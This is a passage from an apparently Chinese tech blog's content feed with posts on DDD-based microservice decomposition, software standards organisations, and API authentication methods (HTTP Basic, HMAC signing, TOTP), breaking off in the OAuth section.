alt="abstract-cost.png"><br>（”抽象”的成本）</p><p>用一个简单的图来表达话，我们的领域模型设计往往在复用性和成本取得平衡的中间区域才有实用价值。前面电信业务同样的场景，业务专家和架构师表示，我们需要更为高度的抽象来满足未来更多业务的接入，因此对于两个业务来说，我们需要进一步抽象出产品和订单的概念。</p><p>但是同时需要注意到，我们最终落地时的微服务会变得更多，也变得更为复杂，当然优势也是很明显的 —— 更多的业务可以接入订单服务，同时订单服务不需要知道接入的具体业务。对于用户的感知来说，可以一次办理多个业务并统一支付了，这正是某电信当前的痛点之一。</p><p><img src="/技术架构/architecture/the-logic-of-microservice-decouping-with-ddd/1868312481.png" alt="model-2-context-explicit.png"><br>（高度抽象的领域模型）</p><h2 id="几个典型的误区"><a href="#几个典型的误区" class="headerlink" title="几个典型的误区"></a>几个典型的误区</h2><p>在大量使用DDD指导微服务拆分的实践后，我们发现很多系统设计存在一些常见的误区，主要分为三类：未成功做出抽象、抽象程度过高、错误的抽象。</p><h3 id="未成功做出抽象"><a href="#未成功做出抽象" class="headerlink" title="未成功做出抽象"></a>未成功做出抽象</h3><p>在实际开发过程中，大家都有一个体会，设计阶段只考虑了一些常见的服务，但是发现项目中有大量可以重用的逻辑，并应该做成单独服务。当我们在做服务拆分时，遗漏了服务的结果是有一些业务逻辑被分散到各个服务中，并不断重复。</p><p>以下是一个检查单，帮助你检查项目上常见的抽象是否具备：</p><ul><li>用户</li><li>权限</li><li>订单</li><li>商品</li><li>支付</li><li>账单</li><li>地址</li><li>通知</li><li>报表单</li><li>日志</li><li>收藏</li><li>发票</li><li>财务</li><li>邮件</li><li>短信</li><li>行为分析</li></ul><h3 id="错误抽象"><a href="#错误抽象" class="headerlink" title="错误抽象"></a>错误抽象</h3><p>对微服务或DDD理解不够。模型具有二义性，被放到不同的限界上下文。例如，订单中的收货地址、用户配置的常用地址以及地址库中的标准地址。这三种地址虽然名称类似，但是在概念上完全不是一回事，假如架构师将”地址“划分到了标准地址库中，势必会造成用户上下文和系统配置上下文、订单上下文存在不必要的耦合。</p><p><img src="/技术架构/architecture/the-logic-of-microservice-decouping-with-ddd/767139593.png" alt="bad-dependce.png"><br>（左边为抽象错误带来的依赖，右边为正确的依赖关系）</p><p>上图的右边为正常的依赖关系，左边产生了不正常的依赖，会进一步产生双向依赖。</p><p>在系统设计时，领域模型的二义性是一个比较难以识别和理解问题。好在我们可以通过画概念图来梳理这些概念的关系，概念图是中学教辅解释大量概念的惯用手段，在表达系统设计时一样有用。</p><p><img src="/技术架构/architecture/the-logic-of-microservice-decouping-with-ddd/1361534084.png" alt="address-concept-diatram.png"><br>（电商系统中“地址”概念的梳理）</p><p>与地址类似的常见还有商品和订单项中的商品；用户和用户组之间有一个成员的概念；短信的概念应该更为具体到一条具体的短信和短信模板的区别。</p><h3 id="组织对架构的干预"><a href="#组织对架构的干预" class="headerlink" title="组织对架构的干预"></a>组织对架构的干预</h3><p>另外一种令人感到惊讶的架构问题是企业的组织架构和团队划分影响了领域模型的正确建立。有一些公司按照渠道来划分了团队，甚至按照 To C （面向于用户）和 To B（面向企业内部）划分的团队，最终设计出来的限界上下文中赫然出现 ”C端文章服务“，”B端文章服务“。</p><p>不乏有一些公司因为团队职责的关系，将本应该集中的服务不得已下放给应用或者BFF（面向前端的backend）。对于这类问题，其实超出了DDD能解决的范围，只能说在建模时警惕此类行为对系统造成很严重的影响。</p><p>另外企业组织架构和技术架构的关系，请参考康威定律的叙述。一个由无数敏捷团队组成的企业，和微服务有天然的联系；传统实时瀑布模型的企业，在大型软件时代竞争力十足，但是在互联网时代却无力应对变化。</p><p><img src="/技术架构/architecture/the-logic-of-microservice-decouping-with-ddd/820780053.png" alt="org-architecture.png"><br>（常见一些公司的组织架构）</p><h3 id="抽象程度过高"><a href="#抽象程度过高" class="headerlink" title="抽象程度过高"></a>抽象程度过高</h3><p>抽象程度过高最典型的一个特征是得到的限界上下文极端的微小。回到我们成本、复用性和抽象程度这几个概念上来，上面我们讨论过，抽象程度虽然可以带来复用性的提高，但是带来的成本非常高，甚至不可接受。</p><p>抽象程度过高带来的成本有：更多的微服务部署带来的运维压力、开发调试难度提高、服务间通信带来的性能开销、跨服务的分布式事务协调等。因此抽象不是越高越好，应根据实际业务需要和成本考虑。</p><p>那相应的，微服务到底应该多小呢？</p><p>业界流传一句话来形容，微服务应该多小：“一个微服务应该可以在二周内完成重写“。这句话可能只是一句调侃，如果真的作为微服务应该多微的标准是不可取的。</p><p>微服务的大小应该取决于划分限界上下文时各个限界上下文内聚程度。订单服务往往是很多IT系统中最为复杂、内聚程度最高的服务，往往比较庞大，但无法强行分为 ”订单part1“ ”订单part2“ 等多个微服务；同样，短信服务可能仅仅负责和外部系统对接，表现的极为简单，但我们往往也需要单独部署。</p><h2 id="从限界上下文到系统架构"><a href="#从限界上下文到系统架构" class="headerlink" title="从限界上下文到系统架构"></a>从限界上下文到系统架构</h2><p>在通过 DDD 得到领域模型和限界上下文后，理论上我们已经得到了微服务的拆分。但是，限界上下文到系统架构还需要完成下面几件事。</p><h3 id="设计微服务之间的依赖关系"><a href="#设计微服务之间的依赖关系" class="headerlink" title="设计微服务之间的依赖关系"></a>设计微服务之间的依赖关系</h3><p>一个合理的分布式系统，系统之间的依赖应该是非常清晰地。依赖，在软件开发中指的是一个应用或者组件需要另外一个组件提供必要的功能才能正常工作。因此被依赖的组件是不知道依赖它的应用的，换句话说，被调用者不需要知道调用方的信息，否则这不是一个合理的依赖。</p><p>在微服务设计时，如果 domain service 需要通过一个 from 参数，根据不同的渠道做出不同的行为，这对系统的拓展是致命的。例如，用户服务对于访问他的来源不应该知晓；用户服务应该对订单、商品、物流等访问者提供无差别的服务。</p><p>因此，微服务的依赖关系可以总结为：上游系统不需要知道下游系统信息，否则请重新审视系统架构。</p><h3 id="设计微服务间集成方式"><a href="#设计微服务间集成方式" class="headerlink" title="设计微服务间集成方式"></a>设计微服务间集成方式</h3><p>拆分微服务是为了更好的集成到一起，对于后续落地来说，还有服务集成这一重要的阶段。微服务之间的集成方式会受到很多因素的制约，前面在讨论微服务到底有多微的时候就顺便提到了集成会带来成本，处于不同的目的可以采用不同的集成方式。</p><ul><li><strong>采用 RPC（远程调用） 的方式集成。</strong> 使用RPC的方式可以让开发者非常容易的切换到分布式系统开发中来，但是RPC的耦合性依然很高，同时需要对RPC平台依赖。业界优秀的RPC框架有dubbo、Grpc、thrift等</li><li><strong>采用消息的方式集成。</strong>使用消息的方式异步传输数据，服务之间使用发布-订阅的方式交互。另外一种思想是通过对系统事件传递，因此产生了 Event Sourcing 这种集成模式，让微服务具备天然的弹性。</li><li><strong>采用RESTful方式集成。</strong>RESTful是一种最大化利用HTTP协议的API设计方式，服务之间通过HTTP API集成。这种方式让耦合变得极低，甚至稍作修改就可以暴露给外部系统使用。</li></ul><p>这三种集成方式耦合程度由高到低，适用于不同的场景，需要根据实际情况选择，甚至在系统中可能同时存在。服务间集成的方式还有其他方式，一般来说，上面三种微服务集成的方式可以概括目前常见系统大部分需求。</p><h3 id="可视化架构和沉淀输出"><a href="#可视化架构和沉淀输出" class="headerlink" title="可视化架构和沉淀输出"></a>可视化架构和沉淀输出</h3><p>第一次读DDD相关的资料和书籍时，没有记住DDD的很多概念，但是子域划分像极了潮汕牛肉火锅的划分图，给我留下深刻的印象。DDD 强调技术人员和业务人员共同协作，DDD 对图的绘制表现的非常随意自然。</p><p>但是在做系统设计时，应该使用更为准确和容易传递的架构图，例如使用 C4 模型中的系统全景图(System Landscape diagram)来表达微服务之间的关系。当然你也可以使用UML来完成架构设计。C4 只是层次化（架构缩放）方式表达架构设计，和UML并不冲突。</p><p>系统架构图除了微服务的关系之外，也需要讲技术选型表达出来。</p><p>微服务集成方式除了通过架构图标识之外，最好也通过API列表的方式将事件风暴中的事件转换为API；除此之外，可以将DDD领域模型细化成聚合根、实体、值对象，请参考DDD的战术设计。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>逻辑往往比经验更为重要。写这篇文章的初衷是为了回答一个问题：如果老板问我，你这个微服务划分的依据是什么，我该怎么有说服力的回复？</p><p>我该回答 “具体情况具体分析？By experience？”还是说，我是通过一套方法对业务逻辑进行分析得到的。当没有足够的经验直接解决问题，或问题庞大到不足以使用经验解决时，能支撑你做出决策就只有对输入问题进行有效的分析。</p><p>使用 DDD 指导微服务划分，能在一定程度上弥补经验的不足，做出有理有据的系统架构设计。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>c4模型中的全景图 <a href="https://c4model.com/#supplementaryDiagrams" target="_blank" rel="noopener">https://c4model.com/#supplementaryDiagrams</a></li><li>概念图 <a href="https://cmap.ihmc.us/" target="_blank" rel="noopener">https://cmap.ihmc.us/</a></li><li>康威定律 <a href="https://zh.wikipedia.org/wiki/康威定律" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%BA%B7%E5%A8%81%E5%AE%9A%E5%BE%8B</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>标准化技术下的软件开发</title>
      <link href="/thinking/thinking/software-standars/"/>
      <url>/thinking/thinking/software-standars/</url>
      
        <content type="html"><![CDATA[<p>聊到集成测试、单元测试等测试分类，我想大多数人都有类似困惑或讨论，集成测试和 E2E 测试到底有啥区别。甚至还有一些系统测试、配置项测试等概念，不但让我们这种非 QA 专业的人弄不清楚，在和我们的 QA 同学讨论时也很难得到清晰地结论。</p><p>家里有一台古董级别的笔记本，掌托和键盘几乎已经被磨花了，一天突然想检查下有没有特别的资料然后好处理掉它。一份测试相关的国标文档（GB/T 15532-2008）吸引了我的注意，这份文档来自于刚毕业时在四川省软件测试中心实习期间，而我几乎已经忘记了那段经历。</p><p>翻看这份文档让我打开了一个新世界的大门，我们在讨论研究的很多问题包括测试分类的定义，已经被业界讨论过很多次，甚至被制定成清晰的文档和规范。</p><p><img src="/thinking/thinking/software-standars/1502523638.png" alt="gb.png"></p><p>不仅是 GB/T 制定了相关标准和大量方法，IEEE 和 IOS 也定义了大量标准供业界参考。在软件工程中，了解相关标准给我们带来非常多的好处，能帮助我们更好地做技术选型、企业应用集成、持续演进以及借力技术生态。</p><h2 id="采用标准技术的优势"><a href="#采用标准技术的优势" class="headerlink" title="采用标准技术的优势"></a>采用标准技术的优势</h2><h3 id="发展成熟"><a href="#发展成熟" class="headerlink" title="发展成熟"></a>发展成熟</h3><p>在计算机科学领域，技术标准最成熟，也是和学术界最接近的是密码学。在软件行业中，最有意思的是很多人对造轮子非常感兴趣（包括我），不过有一些轮子我不建议自己造。这就是加密算法，不止一个人在聊天中谈起对信息安全的看法时说，要是我开发一个自己的加密算法只有我自己的知道（甚至很多真的这么干了），肯定是天底下最安全的。这是一种非常朴素的信息安全认识，自己的创造的“加密算法”也只是根据特定规则对信息的混淆和变换，这甚至落后于凯撒密码。</p><p>现代密码学已经有大量的对称加密、非对称加密、HASH公开算法，甚至建立了一套完整的通信信息安全基础设施（PKI），保证信息安全的是密匙而不是加密算法。与其闭门造车，不如选择 RSA 等大师们的成果。</p><p><img src="/thinking/thinking/software-standars/1112654057.png" alt="rsa.png"></p><p>上面的例子是想说标准的技术大多经过学术界、工业界的验证，相比自己捣腾一个，相对来说更为靠谱。</p><h2 id="技术生态"><a href="#技术生态" class="headerlink" title="技术生态"></a>技术生态</h2><p>选择标准技术另外一个好处是保持开放，能构建出一个技术生态。</p><p>稍具规模的公司或者组织都有一个中心化的账户管理体系，在软件公司我们有一大套内部系统和软件需要和账户系统进行对接，账户系统还被要求以很细致的粒度对权限进行管理。比如办公室的 WIFI、JIRA、邮件、wiki 等平台需要对接账户系统，一些采购的软件可能并不需要我们进行修改就能实现接入，这其中需要一个约定。</p><p>其中一个规范叫做 LDAP，JIRA、邮件、开源WIKI平台支持 LDAP 服务器的接入，甚至国内的软件产品例如禅道也支持 LDAP 接入。</p><p><img src="/thinking/thinking/software-standars/2522579800.png" alt="ldap.png"></p><p>LDAP 只是众多开放标准的一部分，互联网天生具有开放性，因此网络通信和互联网涉及的协议多如牛毛。例如我们的以太网协议 IEEE 802.x、HTTP 协议 RFC 723X 。仅仅网络协议就有数千条，甚至有一点不忍心放上下面这张图。</p><p><img src="/thinking/thinking/software-standars/677063746.jpg" alt="protocal_mini_2.jpg"></p><p>采用标准技术还有其他优势，具体的实现很容易被替换。例如实现 HTTP 协议的客户端很容易的被替换，前几天在和一个同事聊到他们在项目上把 Apache 的 HTTP client 替换成了 OK HTTP；如果在项目中使用了符合 JCP 定义的 Java bean validator 也可以容易的在某些场景下被替换。</p><p>不过值得注意的是业界事实标准有时候可能和一些标准化组织制定的标准并不一致，OSI 7 层协议被称为经典的网络协议，但是目前广泛形成的协议族是 TCP/IP 协议族。</p><h2 id="日常相关的标准技术和组织"><a href="#日常相关的标准技术和组织" class="headerlink" title="日常相关的标准技术和组织"></a>日常相关的标准技术和组织</h2><p>在使用开源项目做技术选型时，如果对技术标准有一些了解，可以帮我们更容易的了解一些技术的生态和工具链。比如上面的 LDAP，我们可以在采购软件时优先考虑支持 LDAP 的产品，从而降低自行接入的成本；对于自己项目上更为具体的实现如设计 API，我们可以选择一套参考标准入如 jsonapi，让沟通成本大大降低；在前后端协作上，如果采用 Swagger 的 openapi 可以容易的找到一套开源工具帮我们完成文档、SDK生成等工作。</p><p>下面让我们一起了解一些互联网常见的技术标准和组织。</p><h3 id="IETF"><a href="#IETF" class="headerlink" title="IETF"></a>IETF</h3><p>IETF 应该是互联网标准组织中名气最大的，它的全称是国际互联网工程任务组（The Internet Engineering Task Force）。IETF下属有很多工作组（WG），专门负责一个领域标准的制定，例如 OAuth。IETF 工作的产出主要是 RFC 文档（Request For Comments）。IETF 最知名的规范是 TCP/IP 协议族，但是我们日常相关更多关注应用层标准，就不介绍通信相关的协议了，下面是一些常见应用层的标准。</p><ul><li><strong>RFC 723X HTTP 协议族</strong> HTTP 标准分为多个版本，目前在用的一般是 1.1。同时 HTTP 标准分为核心标准和拓展标准，例如缓存、会话、内容编码等内容属于拓展部分，在选择 HTTP client 时，需要注意其实现程度可能并不完整。另外 method、状态码等枚举类型在 IANA 中心可以找到。</li><li><strong>OAuth 开放授权协议</strong> OAuth 相关规范和HTTP类似，也分为核心和拓展。核心的标准文档是 RFC 6749 ，而拓展的部分例如 Bearer token 以及 token 的获取、验证和JWT相关的规范都在另外的文档中。值得一提的是，OAuth OpenID connect 不属于 OAuth 的规范，所以认证并不是 OAuth 要求的。</li></ul><h3 id="JCP"><a href="#JCP" class="headerlink" title="JCP"></a>JCP</h3><p>JCP（Java Community Process) 是一个开放的国际组织，主要由 Java 开发者以及被授权者组成。Java 之所以能发展成目前这个规模，离不开标准化进程，JCP 中的一些规范不仅影响了 Java 世界，对其他语言，例如 PHP、Nodejs 也造成了巨大的影响。在日常服务器开发工作中，用到 JCP 标准非常多，例如数据验证、数据库访问和服务器容器：</p><ul><li><strong>Bean Validation</strong> 在 Java 中数据校验的规范化是 JCP 一个典型的实践，从最早的 JSR 349 到 JSR 303，目前已经发展到了 Bean validation 2.0，并开始支持 2SE。Hibernate 最新的 validator 已经开始支持 2.0 的验证规范。早期讲 Java 的书谈到使用 JSR 验证容易让人感到困惑，JSR 只是验证规范，数据验证是由其他的验证器实现的。同时一些非 Java 的验证框架也在参考实现 JCP 的标准。</li><li><strong>JPA Java Persistence</strong> API JPA 定义了对象关系映射以及如何持久化到数据中，JPA、ORM、Hibernate 在 Java 开发时是非常容易被混淆的概念。其中 ORM 只是一个对象映射的概念，JPA 规范了 ORM、数据访问 API、查询语言，Hibernate 对 JPA 进行了实现，JPA 其他的实现还有 Open JPA 和 Eclipse Link 等技术。</li><li><strong>JAX-RS Java API for RESTful Web Services</strong> JAX-RS 定义了 Restful API 构建相关的规范，包括一些常见的注解都来源这个规范，例如 @Path @GET 等，关于 JAX-RS 的实现除了 Spring 全家桶之外，还有 Jersey、RESTeasy 等实现。</li><li><strong>Java servlet servlet</strong> 可以说是 J2EE 中最重要的规范之一，如果不去看 servlet 的规范很难理解 servlet 到底是什么。这也是很多公司面试一般都会问的问题。servlet 定义了 J2EE 应用和服务器容器之间的约定，所以在开发过程中就需要特别注意 web 容器提供的额外的特性，造成耦合。</li></ul><h3 id="W3C"><a href="#W3C" class="headerlink" title="W3C"></a>W3C</h3><p>W3C 中文名称是万维网联盟，是Web技术领域最具权威和影响力的国际中立性技术标准机构，主要负责制定浏览器上一些技术细节，降低浏览器上 HTML、CSS 渲染之间的差异，以及 DOM、XML 和 SVG 等技术。但是需要注意 JavaScript 不是 W3C 的范围，但需要负责浏览器中 JavaScript API 也就是 DOM 规范的制定：</p><ul><li><strong>DOM</strong> 在前端开发中，如果想了解更多浏览器渲染原理和处理 DOM 节点，推荐阅读 W3C 的规范文档，DOM 规范文档中描述了 DOM 节点的构建、移除以及事件等信息。</li><li><strong>CSP</strong> 内容安全策略 CSP 制定了浏览器中加载资源的策略，通过配置让浏览器是否能加载一些资源，例如脚本，能大大提高浏览器对 XSS 攻击的防御能力。</li><li><strong>XML</strong> 嗯，XML 是W3C制定的规范。</li></ul><p>W3C 的标准更多的是指导浏览器开发，对于前端开发来说，技术选型取决于浏览器支持情况。</p><h3 id="ECMA"><a href="#ECMA" class="headerlink" title="ECMA"></a>ECMA</h3><p>ECMA 中文名称是欧洲计算机制造联合会，主要负责计算机制造和编程相关的标准制定。ECMA 制定了许多编程语言的规范，例如 C#、C++ 等，有趣的是 Sun 公司曾经提交了 Java 相关标准给 ECMA 但是随后又撤销了。ECMA 下面有几个我们可能特别关注的规范：ECMAScript、JSON 和办公文档规范。</p><ul><li><strong>ECMAScript</strong> ECMAScript 的前身是网景的 JavaScript 和微软的 JScript，后来网景、微软、sun 等公司提出标准化浏览器中的脚本语言，于是JavaScript 被提交到 ECMA，JavaScript 就成了 ECMA-262 标准化的脚本程序设计语言。目前实现 ECMAScript 规范的还有用来制作 Flash 的 ActionScript。</li><li><strong>JSON</strong> 是一种轻量级的数据交换格式，实际上是 ECMAScript 的一个子集，但是目前来说和语言关系不大，JSON 过于常见，就不讲了。</li><li><strong>Office Open XML</strong> ECMA 下另外一个非常重要的规范，简称 OOXML，现已成为国际文档格式标准。如果在项目中需要使用编程的方式解析 word 文档，参考这个规范下的实现。</li></ul><h3 id="其他规范"><a href="#其他规范" class="headerlink" title="其他规范"></a>其他规范</h3><p>一些组织或者厂商想推广一些通用的技术方案，但是并没有注册到标准组织。其中有很多技术方案对日常工作很有价值，这里也罗列出来：</p><ul><li><strong>JSONAPI</strong> 有时候在设计 Restful 时很头疼，Restful 只是一种设计概念，没有具体的编码实现。jsonapi.org 这个网站试图创建一个规范来定义 RESTful 请求，并且定义了一个新的 MIME 类型 application/vnd.api+json 注册到了 IANA。</li><li><strong>HAL</strong> Hypertext Application Language 于是有一些组织开始着手准备把 Restful 的请求内容规范化，形成一个统一的语言，这就是 HAL。目前不止一个组织在制定相关规范，IETF 目前都还在草案阶段。</li><li><strong>RAML</strong> 当 RESTful API 被设计出来后，如何描述 API 模型又是一个挑战，API 模型可以用于文档、契约测试和SDK生成。如果这种模型被规范化，可以带动整个工具链。API 模型目前有 RAML 和 Swagger 主导的 openAPI</li><li><strong>microformat</strong> 微格式 在 HTML 或者 XML 中，为了让标记语言更为语义化，用于第三方应用程序识别，出现了微格式这类规范。例如，航空公司通过 HTML 格式的邮件发送了机票信息，邮件客户端可以通过微格式识别其中的关键信息，并添加到提示列表中。</li><li><strong>commonmark</strong> markdown 语法规范。</li><li><strong>GraphQL API 查询的语言</strong> 通过发送 GraphQL 语句给服务器可以针对的返回特定的数据，避免多次请求和冗余数据在网络上传输。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>为技术标准化做出贡献的组织还很多，特别是在软件行业之外，建筑、医疗、金融等行业也产出了大量的标准文档。在知识的层层传递中有很多信息丢失了，标准文档给我们提供了第一手、清晰的信息和方案。</p><p>遗憾的是我们在做的一些创新型的工作目前还没有被标准化，CI/CD、敏捷实践、微服务等。在 ThoughtWorks 办公室每个人都耳熟能详的技术或者术语还没有出现在标准文档中，也可能是我还没了解到，不过各大组织的规范文档不失为一座金矿，值得持续探索。</p><p>另外，中国是第一制造业大国，也是发达的互联网国家。除了国家标准之外，参与国际标准制定还比较有限。互联网协议几乎是构建在 IEEE 贡献的协议族之上，难以看到中国的影子，不过在 5G 时代有所发展。这两年国内的开源项目发展迅速，也有一些大厂在向国际标准组织做出贡献，很期待 ThoughtWorks 也能参与其中。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://httpwg.org/specs/" target="_blank" rel="noopener">https://httpwg.org/specs/</a></li><li><a href="https://en.wikipedia.org/wiki/Office_Open_XML" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Office_Open_XML</a></li><li><a href="https://commonmark.org/" target="_blank" rel="noopener">https://commonmark.org/</a></li><li><a href="https://oauth.net/2/" target="_blank" rel="noopener">https://oauth.net/2/</a></li><li><a href="https://www.w3.org/TR/dom/" target="_blank" rel="noopener">https://www.w3.org/TR/dom/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API 文档和前后端协作</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/api-authentication-authorization-credential/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/api-authentication-authorization-credential/</url>
      
        <content type="html"><![CDATA[<p>在一些互联网公司的面试中，面试官往往会问这样一个问题：</p><blockquote><p>“如果禁用浏览器 cookie，如何实现用户追踪和认证？”</p></blockquote><p>遗憾的是依然有大量候选人答非所问，无法搞清楚 cookie 和 session 之间的区别。而在工作中也有让人惊讶的真实案例：把 user ID 存储到 local storage 中当做 token 使用，原因是他们声称弃用了 cookie 这种落后的东西；一个移动端项目，服务器给出的 API 中需要客户端模拟一个 cookie，从而像浏览器中 ajax 那样消费 API。</p><p>互联网是基于 HTTP 协议构建的，而 HTTP 协议因为简单流行开来，但是 HTTP 协议是无状态（通信层面上虚电路比数据报昂贵太多）的，为此人们为了追踪用户想出了各种办法，包括 cookie/session 机制、token、flash 跨浏览器 cookie 甚至浏览器指纹等。</p><p><img src="http://www.printf.cn/usr/uploads/2019/03/4225410804.png" alt="cookies.png"></p><p>把用户身份藏在每一个地方（浏览器指纹技术甚至不需要存储介质）<br>讲使用 spring security 等具体技术的资料已经很多了，这篇文章不打算写框架和代码的具体实现。我们会讨论认证和授权的区别，然后会介绍一些被业界广泛采用的技术，最后会聊聊怎么为 API 构建选择合适的认证方式。</p><h2 id="认证、授权、凭证"><a href="#认证、授权、凭证" class="headerlink" title="认证、授权、凭证"></a>认证、授权、凭证</h2><p>首先，认证和授权是两个不同的概念，为了让我们的 API 更加安全和具有清晰的设计，理解认证和授权的不同就非常有必要了，它们在英文中也是不同的单词。</p><p><img src="/API设计/restful-api/api-authentication-authorization-credential/379091767.png" alt="roles.png"></p><p>认证是 authentication，指的是当前用户的身份，当用户登陆过后系统便能追踪到他的身份做出符合相应业务逻辑的操作。即使用户没有登录，大多数系统也会追踪他的身份，只是当做来宾或者匿名用户来处理。认证技术解决的是 “我是谁？”的问题。</p><p>授权则不同，授权是 authorization，指的是什么样的身份被允许访问某些资源，在获取到用户身份后继续检查用户的权限。单一的系统授权往往是伴随认证来完成的，但是在开放 API 的多系统结构下，授权可以由不同的系统来完成，例如 OAuth。授权技术是解决“我能做什么？”的问题。</p><p>实现认证和授权的基础是需要一种媒介（credentials）来标记访问者的身份或权利，在现实生活中每个人都需要一张身份证才能访问自己的银行账户、结婚和办理养老保险等，这就是认证的凭证；在古代军事活动中，皇帝会给出战的将军颁发兵符，下级将领不关心持有兵符的人，只需要执行兵符对应的命令即可。在互联网世界中，服务器为每一个访问者颁发 session ID 存放到 cookie，这就是一种凭证技术。数字凭证还表现在方方面面，SSH 登录的密匙、JWT 令牌、一次性密码等。</p><p>用户账户也不一定是存放在数据库中的一张表，在一些企业 IT 系统中，对账户管理和权限有了更多的要求。所以账户技术 （accounting）可以帮助我们使用不同的方式管理用户账户，同时具有不同系统之间共享账户的能力。例如微软的活动目录（AD），以及简单目录访问协议（LDAP），甚至区块链技术。<br>还有一个重要的概念是访问控制策略（AC）。如果我们需要把资源的权限划分到一个很细的粒度，就不得不考虑用户以何种身份来访问受限的资源，选择基于访问控制列表（ACL）还是基于用户角色的访问控制（RBAC）或者其他访问控制策略。</p><p>在流行的技术和框架中，这些概念都无法孤立的被实现，因此在现实中使用这些技术时，大家往往为一个 OAuth2 是认证还是授权这种概念争论不休。为了容易理解，我在文末附上了一份常见技术和概念的术语表。下面我会介绍在API开发中常常使用的几种认证和授权技术：HTTP Basic AUthentication、HAMC、OAuth2，以及凭证技术JWT token。</p><h2 id="HTTP-Basic-Authentication"><a href="#HTTP-Basic-Authentication" class="headerlink" title="HTTP Basic Authentication"></a>HTTP Basic Authentication</h2><p>你一定用过这种方式，但不一定知道它是什么，在不久之前，当你访问一台家用路由器的管理界面，往往会看到一个浏览器弹出表单，要求你输入用户密码。</p><p><img src="/API设计/restful-api/api-authentication-authorization-credential/1004061814.png" alt="basic.png"></p><p>在这背后，当用户输入完用户名密码后，浏览器帮你做了一个非常简单的操作:</p><ul><li>组合用户名和密码然后 Base64 编码</li><li>给编码后的字符串添加 Basic 前缀，然后设置名称为 Authorization 的 header 头部</li></ul><p><img src="/API设计/restful-api/api-authentication-authorization-credential/2147659212.png" alt="basic_flow.png"></p><p>API 也可以非常简单的提供 HTTP Basic Authentication 认证方式，那么客户端可以很简单通过 Base64 传输用户名和密码即可:</p><ul><li>将用户名和密码使用冒号连接，例如 username:abc123456</li><li>为了防止用户名或者密码中存在超出 ASCII 码范围的字符，推荐使用UTF-8编码</li><li>将上面的字符串使用 Base 64 编码，例如 dXNlcm5hbWU6YWJjMTIzNDU2</li><li>在 HTTP 请求头中加入 “Basic + 编码后的字符串”，即：Authorization: Basic QWxhZGRpbjpPcGVuU2VzYW1l</li></ul><p>这种方式实现起来非常简单，在大量场景下被采用。当然缺点也很明显，Base64 只能称为编码，而不是加密 (实际上无需配置密匙的客户端并没有任何可靠地加密方式，我们都依赖 TSL 协议)。这种方式的致命弱点是编码后的密码如果明文传输则容易在网络传输中泄露，在密码不会过期的情况下，密码一旦泄露，只能通过修改密码的方式。</p><h2 id="HMAC（AK-SK）认证"><a href="#HMAC（AK-SK）认证" class="headerlink" title="HMAC（AK/SK）认证"></a>HMAC（AK/SK）认证</h2><p>在我们对接一些 PASS 平台和支付平台时，会要求我们预先生成一个 access key（AK） 和 secure key（SK），然后通过签名的方式完成认证请求，这种方式可以避免传输 secure key，且大多数情况下签名只允许使用一次，避免了重放攻击。</p><p>这种基于 AK/SK 的认证方式主要是利用散列的消息认证码 (Hash-based MessageAuthentication Code) 来实现的，因此有很多地方叫 HMAC 认证，实际上不是非常准确。HMAC 只是利用带有 key 值的哈希算法生成消息摘要，在设计 API 时有具体不同的实现。</p><p><img src="http://www.printf.cn/usr/uploads/2019/03/768972510.png" alt="HMAC_hash.png"></p><p>HMAC 在作为网络通信的认证设计中作为凭证生成算法使用，避免了口令等敏感信息在网络中传输。基本过程如下：</p><p>客户端需要在认证服务器中预先设置 access key（AK 或叫 app ID） 和 secure key（SK）<br>在调用 API 时，客户端需要对参数和 access key 进行自然排序后并使用 secure key 进行签名生成一个额外的参数 digest<br>服务器根据预先设置的 secure key 进行同样的摘要计算，并要求结果完全一致<br>注意 secure key 不能在网络中传输，以及在不受信任的位置存放（浏览器等）</p><p>为了让每一次请求的签名变得独一无二，从而实现重放攻击，我们需要在签名时放入一些干扰信息。<br>在业界标准中有两种典型的做法，质疑/应答算法（OCRA: OATH Challenge-Response Algorithm）、基于时间的一次性密码算法（TOTP：Time-based One-time Password Algorithm）。</p><h3 id="质疑-应答算法"><a href="#质疑-应答算法" class="headerlink" title="质疑/应答算法"></a>质疑/应答算法</h3><p>质疑/应答算法需要客户端先请求一次服务器，获得一个 401 未认证的返回，并得到一个随机字符串（nonce）。将 nonce 附加到按照上面说到的方法进行 HMAC 签名，服务器使用预先分配的 nonce 同样进行签名校验，这个 nonce 在服务器只会被使用一次，因此可以提供唯一的摘要。</p><p><img src="/API设计/restful-api/api-authentication-authorization-credential/4156853075.png" alt="ak_sk.png"></p><h3 id="基于时间的一次性密码认证"><a href="#基于时间的一次性密码认证" class="headerlink" title="基于时间的一次性密码认证"></a>基于时间的一次性密码认证</h3><p>为了避免额外的请求来获取 nonce，还有一种算法是使用时间戳，并且通过同步时间的方式协商到一致，在一定的时间窗口内有效（1分钟左右）。</p><p><img src="/API设计/restful-api/api-authentication-authorization-credential/2436879961.png" alt="top.png"></p><p>这里的只是利用时间戳作为验证的时间窗口，并不能严格的算作基于时间的一次性密码算法。标准的基于时间的一次性密码算法在两步验证中被大量使用，例如 Google 身份验证器不需要网络通信也能实现验证（但依赖准确的授时服务）。原理是客户端服务器共享密钥然后根据时间窗口能通过 HMAC 算法计算出一个相同的验证码。</p><p><img src="/API设计/restful-api/api-authentication-authorization-credential/3978829140.png" alt="totp.png"></p><p>TOTP 基本原理和常见厂商</p><h2 id="OAuth2-和-Open-ID"><a href="#OAuth2-和-Open-ID" class="headerlink" title="OAuth2 和 Open ID"></a>OAuth2 和 Open ID</h2><p>OAuth（开放授权）是一个开放标准，允许用户授权第三方网站访问他们存储在另外的服务提供者上的信息，而不需要将用户名和密码提供给第三方网站或分享他们数据的所有内容。<br>OAuth 